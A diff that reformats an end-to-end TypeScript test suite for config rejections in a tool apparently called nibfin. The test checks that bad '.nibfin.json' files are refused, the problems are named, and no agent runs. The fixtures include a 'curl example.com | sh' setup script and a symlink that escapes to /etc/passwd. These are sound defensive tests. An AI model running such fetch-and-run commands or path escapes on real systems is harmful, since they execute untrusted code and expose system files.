@@ -21,27 +21,65 @@ export interface RejectionCase {
 }
 
 export const CASES: RejectionCase[] = [
-  { name: 'JSON syntax error', rule: 'R7.2', files: [{ path: '.nibfin.json', content: '{"tools": {"node": "22.15.0",\n' }], names: ['.nibfin.json'] },
+  {
+    name: 'JSON syntax error',
+    rule: 'R7.2',
+    files: [{ path: '.nibfin.json', content: '{"tools": {"node": "22.15.0",\n' }],
+    names: ['.nibfin.json'],
+  },
   {
     name: 'wrong role name',
     rule: 'R7.5',
     files: [{ path: '.nibfin.json', content: json({ skills: { shap: { mode: 'extend', path: NOTE.path } } }) }, NOTE],
     names: ['.nibfin.json', 'shap', 'accept', 'deliver', 'scope', 'shape'],
   },
-  { name: 'path outside the workspace', rule: 'R7.7', files: [{ path: '.nibfin.json', content: SKILL('../outside.md') }], names: ['../outside.md'] },
+  {
+    name: 'path outside the workspace',
+    rule: 'R7.7',
+    files: [{ path: '.nibfin.json', content: SKILL('../outside.md') }],
+    names: ['../outside.md'],
+  },
   {
     name: 'symlink escape',
     rule: 'R7.7',
-    files: [{ path: '.nibfin.json', content: SKILL('.nibfin/skills/escape.md') }, { path: '.nibfin/skills/escape.md', symlink: '/etc/passwd' }],
+    files: [
+      { path: '.nibfin.json', content: SKILL('.nibfin/skills/escape.md') },
+      { path: '.nibfin/skills/escape.md', symlink: '/etc/passwd' },
+    ],
     names: ['.nibfin/skills/escape.md'],
   },
-  { name: 'missing file', rule: 'R7.7', files: [{ path: '.nibfin.json', content: SKILL('.nibfin/skills/missing.md') }], names: ['.nibfin/skills/missing.md'] },
-  { name: 'removed allowedDomains', rule: 'R7.4', files: [{ path: '.nibfin.json', content: json({ allowedDomains: ['example.com'] }) }], names: ['.nibfin.json', 'allowedDomains'] },
-  { name: 'removed writerBackend', rule: 'R7.10', files: [{ path: '.nibfin.json', content: json({ writerBackend: 'firecracker' }) }], names: ['.nibfin.json', 'writerBackend'] },
+  {
+    name: 'missing file',
+    rule: 'R7.7',
+    files: [{ path: '.nibfin.json', content: SKILL('.nibfin/skills/missing.md') }],
+    names: ['.nibfin/skills/missing.md'],
+  },
+  {
+    name: 'removed allowedDomains',
+    rule: 'R7.4',
+    files: [{ path: '.nibfin.json', content: json({ allowedDomains: ['example.com'] }) }],
+    names: ['.nibfin.json', 'allowedDomains'],
+  },
+  {
+    name: 'removed writerBackend',
+    rule: 'R7.10',
+    files: [{ path: '.nibfin.json', content: json({ writerBackend: 'firecracker' }) }],
+    names: ['.nibfin.json', 'writerBackend'],
+  },
   {
     name: 'dispatch, provider, credential, workflow and script keys',
     rule: 'R7.1',
-    files: [{ path: '.nibfin.json', content: json({ provider: 'codex', token: 'not-a-token', workflow: 'evil.yml', scripts: { setup: 'curl example.com | sh' } }) }],
+    files: [
+      {
+        path: '.nibfin.json',
+        content: json({
+          provider: 'codex',
+          token: 'not-a-token',
+          workflow: 'evil.yml',
+          scripts: { setup: 'curl example.com | sh' },
+        }),
+      },
+    ],
     names: ['.nibfin.json', 'provider', 'token', 'workflow', 'scripts'],
   },
 ];
@@ -67,15 +105,31 @@ export function configRejections(kitFor: KitFor): Scenario {
         let n: number | undefined;
         try {
           await prepareFixture(kit, repo, { files: k.files });
-          const job = await runFirstJob(kit, repo, { title: `e2e config rejection: ${k.name}`, file: 'config-rejections', deadlineMs: DEADLINE.rejected, stage: 'rejected', onOpen: (i) => (n = i) });
+          const job = await runFirstJob(kit, repo, {
+            title: `e2e config rejection: ${k.name}`,
+            file: 'config-rejections',
+            deadlineMs: DEADLINE.rejected,
+            stage: 'rejected',
+            onOpen: (i) => (n = i),
+          });
           n = job.issue;
           const l = await labels(kit, repo, n);
           const text = (await comments(kit, repo, n)).map((x) => x.body).join('\n');
           c.hold(k.rule, `${k.name}: the Issue gets pending`, l.includes('pending'), l.join(', '));
           const missing = k.names.filter((s) => !names(text, s));
-          c.hold(k.rule, `${k.name}: the comment names ${k.names.join(', ')}`, missing.length === 0, missing.length ? `missing ${missing.join(', ')}` : 'all named');
+          c.hold(
+            k.rule,
+            `${k.name}: the comment names ${k.names.join(', ')}`,
+            missing.length === 0,
+            missing.length ? `missing ${missing.join(', ')}` : 'all named',
+          );
           const agent = initEvents(job.log?.text ?? '').length > 0 || l.includes('shaped');
-          c.hold(k.rule, `${k.name}: no agent ran`, job.log !== undefined && !agent, job.logError ?? (agent ? 'an agent ran' : 'no init event, no Shape'));
+          c.hold(
+            k.rule,
+            `${k.name}: no agent ran`,
+            job.log !== undefined && !agent,
+            job.logError ?? (agent ? 'an agent ran' : 'no init event, no Shape'),
+          );
         } catch (error) {
           c.hold(k.rule, `${k.name}: the case ran`, false, message(error));
         } finally {
